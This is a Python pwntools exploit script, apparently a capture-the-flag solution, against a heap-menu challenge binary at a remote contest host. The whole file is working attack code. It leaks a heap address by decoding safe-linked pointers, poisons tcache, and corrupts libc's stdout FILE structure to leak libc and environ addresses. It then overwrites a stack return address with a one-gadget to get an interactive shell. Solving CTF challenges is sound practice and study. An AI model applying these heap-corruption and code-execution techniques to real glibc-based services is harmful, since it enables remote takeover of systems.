from pwn import *

elf = ELF("./main_patched")
libc = ELF("./libc")

context.binary = elf
context.terminal = ['konsole', '-e']

# p = process(["./ld", "./main"])
# p = process()
while True:
    p = remote("chall1.lagncra.sh", 15357)
    # p = remote("172.17.0.2", 8081)

    def alloc(index, contents):
        p.sendlineafter(b'>> ', b'1')
        p.sendlineafter(b': ', str(index).encode())
        p.sendafter(b': ', contents)

    def free(index):
        p.sendlineafter(b'>> ', b'2')
        p.sendlineafter(b': ', str(index).encode())

    def read(index):
        p.sendlineafter(b'>> ', b'3')
        p.sendlineafter(b': ', str(index).encode())
        leak = bytearray(8)

        for i in range(8):
            p.recvuntil(b' = ')
            leak[i] = int(p.recvline(), 16)

        print(leak)

        temp = leak[7] 

        for i in range(8):
            next_val = leak[i] ^ temp
            leak[i] = temp
            temp = next_val

        decoded_ptr = int.from_bytes(leak, byteorder='little')

        return decoded_ptr

    def edit(index, data):
        p.sendlineafter(b'>> ', b'4')
        p.sendlineafter(b': ', str(index).encode())
        p.sendafter(b': ', data)

    def encrypt(pos, ptr):
        return (pos >> 12) ^ ptr

    alloc(0, b'a')
    alloc(1, b'a')  
    free(1)

    heap_leak = read(1) << 12
    print(hex(heap_leak))

    free(0) 

    edit(0, pack(encrypt(heap_leak+0x6dc, heap_leak+0x90)))

    alloc(0, b'a')
    alloc(1, flat(
        0xdeadbeef,
    ))

    free(0)

    edit(1, flat(
        heap_leak+0x10,
    ))

    alloc(0,
        pack(0x20)
    )

    edit(1, flat(
        heap_leak+0x80
    ))

    alloc(0, flat(
        0, 0x661,
    ))

    free(1)
    # gdb.attach(p, "break *alloc_chunk")
    # I disabled aslr for local testing
    try:
        edit(0, flat(0, 0x661) + pack(0x45c0+0x10).replace(b'\x00', b''))

        alloc(1, flat(
            heap_leak,
            heap_leak + 0x2c0,
            heap_leak,
        ))

        p.recv(152)
        temp = p.recv(8, timeout=1)
        print(temp)
        libc_leak = u64(temp) - libc.symbols['main_arena'] - 96
        print(hex(libc_leak))

        no_write_flag = 0xfbad1800 | 0x8 

        edit(0, b'a' * 16 + pack(libc_leak + libc.symbols['_IO_2_1_stdout_']))
        alloc(1, pack(no_write_flag) + pack(libc_leak + libc.symbols['environ'] + 8))

        # Nothing will be printed here now on
        def edit_raw(index, data):
            import time
            time.sleep(0.5)
            p.sendline(b'4')
            time.sleep(0.5)
            p.sendline(str(index).encode())
            time.sleep(0.5)
            p.send(data)
            time.sleep(0.5)

        def alloc_raw(index, contents):
            time.sleep(0.5)
            p.sendline(b'1')
            time.sleep(0.5)
            p.sendline(str(index).encode())
            time.sleep(0.5)
            p.send(contents)
            time.sleep(0.5)

        environ = libc_leak + libc.symbols['environ']

        edit_raw(0, b'a' * 16 + pack(libc_leak + libc.symbols['_IO_2_1_stdout_'] + 0x20))
        alloc_raw(1, flat(
            environ,
            environ + 8,
            environ + 8,
        ))

        # edit_raw(0, b'a' * 16 + pack(libc_leak + libc.symbols['_IO_2_1_stdout_']))
        # alloc_raw(1, pack(0xfbad1800))

        environ_leak = u64(p.recv(8))
        print(hex(environ_leak))
        pause()
        edit_raw(0, b'b' * 16 + pack(environ_leak - 368 - 8))
        pause()
        alloc_raw(1, flat(
            b'a' * 8,
            libc_leak + 0xc0faf
        ))

        p.interactive()   
    except EOFError:
        pass
    
    p.close()